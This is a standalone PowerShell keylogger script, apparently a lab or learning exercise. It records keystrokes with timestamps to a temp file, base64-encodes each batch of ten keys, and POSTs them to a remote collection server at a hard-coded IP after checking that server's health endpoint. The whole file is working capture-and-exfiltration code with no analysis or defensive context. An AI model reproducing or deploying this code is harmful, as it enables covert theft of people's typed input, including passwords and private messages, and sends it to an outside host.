$URL = "http://172.19.240.1:5000"
$LOG_FILE = "$env:TEMP\keylog.txt"
$BATCH_SIZE = 10
$keysLogged = 0

function Test-ServerConnection {
    try {
        $response = Invoke-RestMethod -Uri "$URL/healthcheck" -Method GET -TimeoutSec 3
        return $response.status -eq "ready"
    } catch {
        return $false
    }
}

Write-Host "[+] Attempting to connect to server at $URL" -ForegroundColor Yellow
while (-not (Test-ServerConnection)) {
    Write-Host "[!] Server not ready, retrying in 5 seconds..." -ForegroundColor Red
    Start-Sleep -Seconds 5
}

Write-Host "[✓] Connection established with server" -ForegroundColor Green

while ($true) {
    $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

    #ignore cases
    if ($key.VirtualKeyCode -in @(8, 27, 37, 38, 39, 40, 46)) {
        continue
    }

    if ($key.Character) {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "[$timestamp] $($key.Character)" | Out-File -Append -FilePath $LOG_FILE
        $keysLogged++
        Write-Host $key.Character -NoNewline -ForegroundColor DarkGray

        if ($keysLogged -ge $BATCH_SIZE) {
            $rawData = Get-Content $LOG_FILE -Raw
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
            $base64 = [System.Convert]::ToBase64String($bytes)

            $body = @{ data = $base64 } | ConvertTo-Json

            try {
                $response = Invoke-RestMethod -Uri "$URL/receive" -Method POST -Body $body -ContentType "application/json"
                Clear-Content $LOG_FILE
                $keysLogged = 0
                Write-Host "`n[✓] Batch sent to server" -ForegroundColor Green
            } catch {
                Write-Host "`n[X] Failed to send batch: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }
}